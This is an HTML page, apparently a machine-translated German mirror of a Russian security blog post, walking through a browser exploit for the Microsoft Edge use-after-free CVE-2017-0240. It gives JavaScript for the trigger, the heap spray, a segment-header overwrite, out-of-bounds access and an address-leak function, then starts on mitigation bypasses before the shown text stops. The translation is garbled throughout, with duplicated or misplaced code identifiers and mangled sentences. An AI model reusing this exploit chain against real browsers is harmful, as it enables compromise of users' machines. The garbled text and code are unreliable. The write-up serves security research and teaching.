<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë©üèª‚Äçüç≥ üçû üëΩ Microsoft Edge von CVE zu RCE unter Windows 10 ‚èπÔ∏è üÜó #‚É£</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Im Rahmen dieses Artikels werden wir den Prozess des Schreibens eines Exploits f√ºr eine Sicherheitsanf√§lligkeit in Microsoft Edge mit dem anschlie√üend...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Microsoft Edge von CVE zu RCE unter Windows 10</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/455594/"><p><img src="https://habrastorage.org/webt/l6/oc/0a/l6oc0axkoxyoiss6dr77cytm1_e.jpeg" alt="Intro"></p><br><p>  Im Rahmen dieses Artikels werden wir den Prozess des Schreibens eines Exploits f√ºr eine Sicherheitsanf√§lligkeit in Microsoft Edge mit dem anschlie√üenden Beenden der Sandbox ausreichend detailliert betrachten.  Wenn Sie wissen m√∂chten, wie dieser Prozess aussieht, begr√º√üen Sie unter cat! </p><a name="habracut"></a><br><h2 id="vvedenie">  Einf√ºhrung </h2><br><p> Sp√§testens <code>Pwn2Own 2019</code> in Montreal wurde in der Kategorie Browser ein Exploit zum Hacken von <code>Microsoft Edge</code> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">demonstriert</a> .  Hierf√ºr wurden zwei Sicherheitsanf√§lligkeiten verwendet: <code>double free</code> im Renderer und eine logische Sicherheitsanf√§lligkeit beim Beenden der Sandbox.  Diese beiden Sicherheitsanf√§lligkeiten wurden k√ºrzlich geschlossen und mit dem entsprechenden <code>CVE</code> : <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><code>CVE-2019-0940</code></a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><code>CVE-2019-0938</code></a> .  Weitere <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Informationen zu</a> Sicherheitsl√ºcken finden Sie im Blog: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Pwn2Own 2019: Microsoft Edge Renderer Exploitation (CVE-2019-0940).</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 1</a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Pwn2Own 2019: Microsoft Eedge Sandbox Escape (CVE-2019-0938).</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 2</a> . </p><br><p>  Als Teil unseres Artikels m√∂chten wir am Beispiel eines <code>Microsoft Edge</code> unter <code>Windows 10</code> Verwendung von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><code>CVE-2017-0240</code></a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><code>CVE-2016-3309</code></a> zeigen, wie ein solcher Exploit geschrieben wird und wie viel Zeit und Ressourcen daf√ºr ben√∂tigt werden.  Einer der Unterschiede besteht darin, dass in unserem Szenario die Sicherheitsanf√§lligkeit im <code>Windows 10</code> Kernel zum Beenden der Sandbox verwendet wird, wenn der in <code>Pwn2Own</code> demonstrierte Exploit eine logische Sicherheitsanf√§lligkeit zum Beenden der Sandbox verwendet hat.  Wie Patches von <code>Microsoft</code> zeigen, gibt es im Kernel viel mehr Schwachstellen als Schwachstellen bei der Implementierung der Sandbox.  Infolgedessen ist es viel wahrscheinlicher, dass eine solche Kette von Schwachstellen auftritt, und es ist n√ºtzlich, dies f√ºr IS-Mitarbeiter in Unternehmen zu wissen. </p><br><h2 id="ishodnye-dannye">  Ausgangsdaten </h2><br><p>  Dieser Artikel behandelt den Prozess des Schreibens eines eint√§gigen Exploits f√ºr den <code>Microsoft Edge</code> Browser.  <code>CVE-2017-0240</code> wird betrieben.  Die erste Phase des Betriebs basiert auf Materialien aus der Quelle [1], wir erhalten ein <code>arbitrary address read/write</code> und lernen verschiedene Techniken kennen, die bei der Ausnutzung solcher Schwachstellen hilfreich sein k√∂nnen.  Als N√§chstes stellen wir Ihnen das Tool <code>pwn.js</code> , mit dem Sie beliebige Funktionen aufrufen k√∂nnen, die auf willk√ºrlichem Lesen und Schreiben basieren, und die verschiedene <code>mitigations</code> und M√∂glichkeiten zur Umgehung dieser Funktionen ber√ºcksichtigen.  In der letzten Phase wird die Windows <code>CVE-2016-3309</code> Kernel-Sicherheitsanf√§lligkeit ausgenutzt, um die Berechtigungen zu erh√∂hen, <code>AppContainer</code> Einschr√§nkungen zu umgehen und die vollst√§ndige Kontrolle √ºber den angegriffenen Computer zu erlangen. </p><br><p>  Der Betrieb wird am Stand mit <code>Microsoft Windows 10 Pro 1703 (10.0.15063)</code> und dem <code>Microsoft Edge (40.15063.0.0)</code> Browser <code>Microsoft Edge (40.15063.0.0)</code> . </p><br><h2 id="shag-1-poluchenie-arbitrary-address-readwrite-primitiva">  Schritt 1. Erhalten eines <code>arbitrary address read/write</code> eine <code>arbitrary address read/write</code> </h2><br><h3 id="opisanie-uyazvimosti-i-poluchenie-oob">  Beschreibung der Sicherheitsanf√§lligkeit und des Erhaltens von <code>OOB</code> </h3><br><p>  In der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">copyFromChannel-</a> Methode des <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Audio Buffer-</a> Objekts <code>use-after-free</code> eine Sicherheitsanf√§lligkeit vom Typ <code>use-after-free</code> vorhanden. </p><br><blockquote>  AudioBuffer ist die Schnittstelle eines kurzen Audio-Assets im Speicher, das aus einer Audiodatei mit der Methode AudioContext.decodeAudioData () oder aus den Quelldaten mit der Methode AudioContext.createBuffer () erstellt wurde.  In AudioBuffer platzierte Audiodaten k√∂nnen in AudioBufferSourceNode wiedergegeben werden. </blockquote><p>  Die Pr√§sentation von <code>The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</code> bietet eine detaillierte Analyse der Sicherheitsanf√§lligkeit und des Patches.  Wenn die <code>copyFromChannel</code> Methode <code>copyFromChannel</code> , wird der Inhalt des <code>copyFromChannel</code> in den durch das erste Argument angegebenen <code>copyFromChannel</code> kopiert.  Die Methode akzeptiert auch die Kanalnummer ( <code>channelNumber</code> ) und den Offset im <code>startInChannel</code> ( <code>startInChannel</code> ), ab dem kopiert werden muss.  Vor dem direkten Kopieren von Daten zum <code>destination</code> in der Funktion <code>CDOMAudioBuffer::Var_copyFromChannel</code> der <code>CDOMAudioBuffer::Var_copyFromChannel</code> zwischengespeichert (die Adresse und Gr√∂√üe des Puffers werden in lokalen Funktionsvariablen auf dem Stapel gespeichert) und die <code>channelNumber</code> und <code>startInChannel</code> werden in den Typ <code>Int</code> <code>startInChannel</code> , f√ºr den die <code>valueOf</code> Methode der konvertierten Objekte aufgerufen wird.  Die Sicherheitsanf√§lligkeit besteht darin, dass ein zwischengespeicherter Puffer zum Zeitpunkt der Typkonvertierung in der √ºberschriebenen Methode des <code>valueOf</code> Objekts <code>valueOf</code> kann.  Zur √úberpr√ºfung verwenden wir den folgenden Code: </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// ,     var t2 = new Float32Array(0x20000); var ta = new Uint8Array(t2.buffer); for (i=0;i&lt;t2.length;i++) t2[i] = 0x66; var myctx = new AudioContext(); var audioBuf = myctx.createBuffer(1, 0x25, 22050); //   -   var t = audioBuf.getChannelData(0); var ta2 = new Uint8Array(t.buffer); for(i=0;i&lt;ta2.length;i++) ta2[i]=0x55; //     valueOf var obj = { valueOf: function () { //   var worker = new Worker('worker.js'); worker.postMessage(0, [t2.buffer]); worker.terminate(); worker = null; //    sleep(1000); return 0; } }; //   audioBuf.copyFromChannel(t2, obj, 0);</span></span></code> </pre> <br><p>  Dieser Code verwendet die <code>Web Workers</code> Technologie, um den Puffer freizugeben.  Nachdem wir einen leeren <code>Worker</code> , k√∂nnen wir ihm mithilfe der <code>postMessage</code> Methode eine Nachricht senden.  Das zweite optionale <code>transfer</code> dieser Methode verwendet ein Array <code>Transferable</code> Objekte ( <code>ArrayBuffer</code> , <code>MessagePost</code> oder <code>ImageBitmap</code> ). Die Rechte an dem Objekt werden an <code>Worker</code> und das Objekt ist im aktuellen Kontext nicht mehr verf√ºgbar, sodass es gel√∂scht werden kann.  Danach erfolgt ein Aufruf zum <code>sleep</code> - eine Funktion, die die Ausf√ºhrung eines Programms vor√ºbergehend stoppt (sie wird unabh√§ngig implementiert).  Dies ist erforderlich, damit das Garbage Collection-System ( <code>GC</code> , <code>Garbage Collector</code> ) den Puffer freigeben kann, dessen Rechte √ºbertragen wurden. </p><br><blockquote>  Web Worker bieten eine einfache M√∂glichkeit, Skripte im Hintergrundthread auszuf√ºhren.  Worker-Thread kann Aufgaben ausf√ºhren, ohne die Benutzeroberfl√§che zu beeintr√§chtigen.  Dar√ºber hinaus k√∂nnen sie E / A mit XMLHttpRequest ausf√ºhren (obwohl die Attribute responseXML und channel immer null sind).  Ein vorhandener Worker kann √ºber den in diesem Code angegebenen Ereignishandler JavaScript-Nachrichten an den Erstellercode senden (und umgekehrt). </blockquote><p>  Wenn Sie diesen Code in Edge unter dem Debugger ausf√ºhren, kann der folgende Absturz auftreten. </p><br><p><img src="https://habrastorage.org/webt/iv/vx/zx/ivvxzxzff-qsxl8pxdqy6pmkbnq.png" alt="Schritt 01 bemerkt"></p><br><p>  Infolgedessen versucht der Aufruf von <code>copyFromChannel</code> , den Inhalt des <code>copyFromChannel</code> in den nicht zugewiesenen Speicherbereich zu kopieren.  Um die Sicherheitsanf√§lligkeit auszunutzen, m√ºssen alle Objekte in diesem Speicherbereich zugeordnet werden.  In diesem Fall ist das Array-Segment perfekt. </p><br><p>  Arrays in <code>Chakra</code> (die im <code>Edge</code> Browser verwendete <code>JS</code> Engine) sind wie folgt angeordnet: Das Array-Objekt hat eine feste Gr√∂√üe, die Zeiger auf die Array-Objekte (oder Werte im Fall von <code>IntArray</code> ) werden in einem separaten Speicherbereich gespeichert - dem Segment, dessen Zeiger im Objekt enthalten ist Array.  Der Segmentheader enth√§lt verschiedene Informationen, einschlie√ülich der Gr√∂√üe des Segments, die der Gr√∂√üe des Arrays entspricht.  Die Gr√∂√üe des Arrays ist auch im Array-Objekt selbst vorhanden.  Schematisch sieht es so aus: </p><br><p><img src="https://habrastorage.org/webt/kh/i1/wr/khi1wrtatqg2jq2bkhaz29b7u68.jpeg" alt="Array-struktur"></p><br><p>  Wenn es uns also gelingt, das Array-Segment im zuvor freigegebenen Bereich auszuw√§hlen, k√∂nnen wir den Header des Array-Segments mit dem Inhalt des Audiopuffers √ºberschreiben.  Dazu √§ndern wir den obigen Code, indem wir nach dem <code>sleep(1000);</code> die folgenden Zeilen hinzuf√ºgen <code>sleep(1000);</code>  :: </p><br><pre> <code class="javascript hljs">... <span class="hljs-comment"><span class="hljs-comment">/*        ,    .   arr        */</span></span> arr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">128</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { arr[i] = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> j = <span class="hljs-number"><span class="hljs-number">0</span></span>; j &lt; arr[i].length; j++) arr[i][j] = <span class="hljs-number"><span class="hljs-number">0x30303030</span></span>; } ...</code> </pre> <br><p>  Die Gr√∂√üe der Arrays wird so ausgew√§hlt, dass die Gr√∂√üe des Arraysegments das gesamte Heap-Segment einnimmt (das minimale unteilbare St√ºck Heap-Speicher, dessen Gr√∂√üe 0x10000 Byte betr√§gt).  F√ºhren Sie diesen Code aus und geben Sie die <code>memcpy</code> Funktion als Haltepunkt an (es werden viele <code>memcpy</code> Aufrufe ausgef√ºhrt, daher ist es sinnvoll, zuerst bei <code>edgehtml!WebCore::AudioBufferData::copyBufferData</code> ), in dem der Absturz aufgetreten ist.  Wir erhalten folgendes Ergebnis: </p><br><p><img src="https://habrastorage.org/webt/nn/5u/yn/nn5uyncl0hvooyoar3lnua8cc8u.png" alt="Schritt 02"></p><br><p>  Gro√üartig!  Jetzt k√∂nnen wir den Header des Array-Segments mit unseren eigenen Werten √ºberschreiben.  Die interessantesten Werte in diesem Fall sind die Gr√∂√üe des Arrays, deren Versatz wir im obigen Screenshot sehen k√∂nnen.  √Ñndern Sie den Inhalt des Audiopuffers wie folgt: </p><br><pre> <code class="javascript hljs">... var t = audioBuf.getChannelData(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ta2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Uint32Array</span></span>(t.buffer); ta2[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0xffe0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0xfba6</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span> - <span class="hljs-number"><span class="hljs-number">2</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0x40404040</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>; ...</code> </pre> <br><p>  <code>ta2[14]</code> auf die Werte von <code>ta2[14]</code> und <code>ta2[15]</code> - sie beziehen sich bereits nicht auf den <code>ta2[15]</code> , sondern auf die Array-Werte selbst.  Damit k√∂nnen wir das Array, das wir im globalen <code>arr</code> Array ben√∂tigen, wie folgt bestimmen: </p><br><pre> <code class="javascript hljs">... for(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(arr[i][<span class="hljs-number"><span class="hljs-number">0</span></span>] == <span class="hljs-number"><span class="hljs-number">0x40404040</span></span> &amp;&amp; arr[i][<span class="hljs-number"><span class="hljs-number">1</span></span>] == <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>) { alert(<span class="hljs-string"><span class="hljs-string">'Target array idx: '</span></span> + i); target_idx = i; target_arr = arr[i]; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre> <br><p>  Wenn als Ergebnis ein Array gefunden wurde, dessen erste beiden Elemente auf bestimmte Weise ge√§ndert wurden, ist alles in Ordnung.  Jetzt haben wir ein Array, dessen Segmentgr√∂√üe gr√∂√üer ist als es tats√§chlich ist.  Die restlichen Arrays k√∂nnen freigegeben werden. </p><br><p>  Hierbei ist zu beachten, dass die Gr√∂√üe des Arrays in zwei Entit√§ten vorhanden ist: im Array-Objekt, in dem es unver√§ndert blieb, und im Array-Segment, in dem wir es vergr√∂√üert haben.  Es stellt sich heraus, dass die Gr√∂√üe im Array-Objekt ignoriert wird, wenn der Code im <code>JIT</code> Modus ausgef√ºhrt und optimiert wurde.  Dies ist beispielsweise wie folgt leicht zu erreichen: </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_get</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> target_arr[idx]; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_set</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx, val</span></span></span><span class="hljs-function">) </span></span>{ target_arr[idx] = val; } <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>; i++) { arr_set(i, arr_get(i)); }</code> </pre> <br><p>  Danach k√∂nnen Sie mit den <code>arr_set</code> <code>arr_get</code> und <code>arr_set</code> die Grenzen des Arrays √ºberschreiten ( <code>OOB</code> , <code>out-of-bound</code> ). </p><br><h3 id="ispolzovanie-oob-dlya-polucheniya-primitiva-chteniya-i-zapisi-po-proizvolnomu-adresu">  Verwenden von <code>OOB</code> , um das Grundelement Lesen und Schreiben an eine beliebige Adresse zu √ºbertragen </h3><br><p>  In diesem Abschnitt betrachten wir eine Technik, mit der Sie mit <code>OOB</code> eine beliebige Adresse lesen und schreiben k√∂nnen.  Die Methode, mit der wir dies erhalten, wird der in der Quelle [1] verwendeten √§hnlich sein, es wird jedoch auch signifikante √Ñnderungen geben. </p><br><p>  In der verwendeten Version von <code>Edge</code> Speicherbl√∂cke f√ºr den Heap nacheinander zugewiesen, wodurch sie beim Zuweisen einer gro√üen Anzahl von Objekten fr√ºher oder sp√§ter nach dem Arraysegment angezeigt werden, √ºber das wir hinausgehen k√∂nnen. </p><br><p>  Erstens k√∂nnen wir einen Zeiger auf eine virtuelle Tabelle von Objektmethoden ( <code>vftable</code> ) <code>vftable</code> , um die Randomisierung des Prozessadressraums ( <code>ASLR</code> ) zu umgehen.  Aber der Zugriff auf welche Objekte hilft uns, willk√ºrliches Lesen und Schreiben zu erreichen?  Einige <code>DataView</code> Objekte eignen sich hervorragend daf√ºr. </p><br><blockquote>  Die DataView bietet eine einfache Schnittstelle zum Lesen und Schreiben mehrerer numerischer Typen in einem bin√§ren ArrayBuffer, unabh√§ngig von der Reihenfolge der Plattformbytes. </blockquote><p>  Die interne Struktur der <code>DataView</code> enth√§lt einen Zeiger auf einen Puffer.  Zum Lesen und Schreiben an eine beliebige Adresse k√∂nnen wir beispielsweise eine Kette von zwei <code>DataView</code> ( <code>dv1</code> und <code>dv2</code> ) wie folgt <code>dv1</code> : <code>dv1</code> als <code>dv1</code> Puffer die Adresse <code>dv2</code> indem Sie auf das Array zugreifen.  Mit <code>dv1</code> wir nun die Adresse des <code>dv2</code> Puffers <code>dv2</code> , wodurch willk√ºrliches Lesen und Schreiben erreicht wird.  Schematisch kann dies wie folgt dargestellt werden: </p><br><p><img src="https://habrastorage.org/webt/ch/9n/do/ch9ndofe4zamumfvihnmv6xtg-o.jpeg" alt="Beliebige Adresse lesen / schreiben"></p><br><p>  Um diese Methode verwenden zu k√∂nnen, m√ºssen Sie lernen, wie Sie die Adressen von Objekten im Speicher ermitteln.  Dazu gibt es die folgende Technik: Sie m√ºssen ein neues <code>Array</code> erstellen, mit <code>OOB</code> dessen <code>vftable</code> und <code>typeId</code> (die ersten beiden 64-Bit-Felder der Struktur) <code>vftable</code> und das Objekt, f√ºr das die Adresse von Interesse ist, dem ersten Element des Arrays zuweisen.  Anschlie√üend m√ºssen Sie die zuvor gespeicherten <code>typeId</code> <code>vftable</code> und <code>typeId</code> wiederherstellen.  Nun kann das Junior- und Senior-Doppelwort der Objektadresse erhalten werden, indem auf das erste und zweite Element des Arrays Bezug genommen wird.  Tatsache ist, dass das neue Array standardm√§√üig <code>IntArray</code> ist und 4-Byte-Werte des Arrays <code>IntArray</code> in seinem Segment gespeichert werden.  Wenn Sie einem Array ein Objekt zuweisen, wird das Array in ein <code>ObjectArray</code> konvertiert und in seinem Segment werden die Adressen der Objekte gespeichert.  Die Konvertierung √§ndert <code>vftable</code> und <code>typeId</code> .  Wenn wir also die urspr√ºnglichen Werte <code>vftable</code> und <code>typeId</code> wiederherstellen, k√∂nnen wir √ºber die Elemente dieses Arrays direkt auf das Segment zugreifen.  Der schematisch beschriebene Prozess kann wie folgt dargestellt werden: </p><br><p><img src="https://habrastorage.org/webt/un/np/-z/unnp-zlvr6ql9m5_f9rmxrdwt20.jpeg" alt="Zeigerleck"></p><br><p>  Die Funktion zum Abrufen der Adresse sieht folgenderma√üen aus: </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addressOf</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">obj</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> hdr_backup = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">4</span></span>); <span class="hljs-comment"><span class="hljs-comment">//  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) hdr_backup[i] = arr_get(intarr_idx + i); intarr_object[0] = obj; //  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) arr_set(intarr_idx + i, hdr_backup[i]); //         return [intarr_object[0], intarr_object[1]]; }</span></span></code> </pre> <br><p>  Eine offene Frage bleibt die Erstellung der notwendigen Objekte und deren Suche mit <code>OOB</code> .  Wie bereits erw√§hnt, werden sie beim Zuweisen einer gro√üen Anzahl von Objekten fr√ºher oder sp√§ter nach dem Array-Segment hervorstechen, √ºber das wir hinausgehen k√∂nnen.  Um die erforderlichen Objekte zu finden, m√ºssen Sie nur die Indizes au√üerhalb des Arrays durchsuchen, um nach den erforderlichen Objekten zu suchen.  Weil  Alle Objekte desselben Typs befinden sich in einem Segment des Heapspeichers. Sie k√∂nnen die Suche optimieren und die Segmente des <code>0x10000</code> in Schritten von <code>0x10000</code> und nur die ersten Werte ab dem Beginn jedes Segments des <code>0x10000</code> √ºberpr√ºfen.  Um Objekte zu identifizieren, k√∂nnen Sie ihnen eindeutige Werte f√ºr einige Parameter festlegen (z. B. f√ºr <code>DataView</code> kann dies <code>byteOffset</code> ) oder mithilfe der bereits bekannten Konstanten in der Struktur des Objekts (in der verwendeten Version von <code>Edge</code> in <code>IntArray</code> wird der Wert <code>0x10005</code> immer bei <code>0x18</code> ). </p><br><p>  Durch Kombinieren aller oben genannten Techniken k√∂nnen Sie lesen und an eine beliebige Adresse schreiben.  Unten finden Sie einen Screenshot zum Lesen von <code>DataView</code> Speicherobjekten. </p><br><p><img src="https://habrastorage.org/webt/fe/i5/o3/fei5o3k0zh3pogdmb5diifeick8.png" alt="Speherherverlust"></p><br><h2 id="shag-2-vypolnenie-proizvolnyh-funkciy-api">  Schritt 2. Ausf√ºhren beliebiger API-Funktionen </h2><br><p>  Zu diesem Zeitpunkt konnten wir bei der Anzeige von <code>Edge</code> Inhalten an eine beliebige Adresse lesen und schreiben.  Ber√ºcksichtigen Sie die wichtigsten Technologien, die den weiteren Betrieb der Anwendung und ihre Problemumgehungen beeintr√§chtigen sollten.  Wir haben bereits eine kurze Reihe von Artikeln √ºber <code>  app specific security mitigation</code> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 1, Einf√ºhrung</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 2, Internet Explorer und Edge</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 3, Google Chrome</a> ). <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Beachten Sie</a> jedoch, dass Entwickler nicht stillstehen und ihren Produkten neue Tools hinzuf√ºgen Schutz. </p><br><h3 id="randomizaciya-adresnogo-prostranstva-aslr">  Adressraum-Randomisierung ( <code>ASLR</code> ) </h3><br><blockquote>  ASLR (English Address Space Layout Randomization) ist eine Technologie, die in Betriebssystemen verwendet wird und die Position wichtiger Datenstrukturen im Prozessadressraum zuf√§llig √§ndert, n√§mlich: ausf√ºhrbare Dateibilder, geladene Bibliotheken, Heaps und stapeln. </blockquote><p>  Oben haben wir gelernt, die Adressen von virtuellen Klassentabellen zu lesen. Mit ihnen k√∂nnen wir die Basisadresse des <code>Chakra.dll</code> Moduls leicht berechnen, sodass <code>ASLR</code> keine Probleme f√ºr den weiteren Betrieb darstellt. </p><br><h3 id="data-execution-protection-dep-nx">  Datenausf√ºhrungsschutz ( <code>DEP</code> , <code>NX</code> ) </h3><br><blockquote>  Data Execution Prevention (DEP) ist eine in Linux, Mac OS X, Android und Windows integrierte Sicherheitsfunktion, die verhindert, dass eine Anwendung Code aus einem Speicherbereich ausf√ºhrt, der als "Nur Daten" gekennzeichnet ist.  Dadurch werden einige Angriffe verhindert, bei denen beispielsweise Code in einem solchen Bereich mithilfe von Puffer√ºberl√§ufen gespeichert wird. </blockquote><p>  Eine M√∂glichkeit, diesen Schutz zu <code>VirtualAlloc</code> , besteht darin, <code>VirtualAlloc</code> mithilfe von <code>ROP</code> Ketten <code>VirtualAlloc</code> .  Im Fall von <code>Edge</code> funktioniert diese Methode jedoch aufgrund von <code>ACG</code> (siehe unten). </p><br><h3 id="control-flow-guard-cfg">  Kontrollflussschutz ( <code>CFG</code> ) </h3><br><blockquote>  <code>CFG</code> 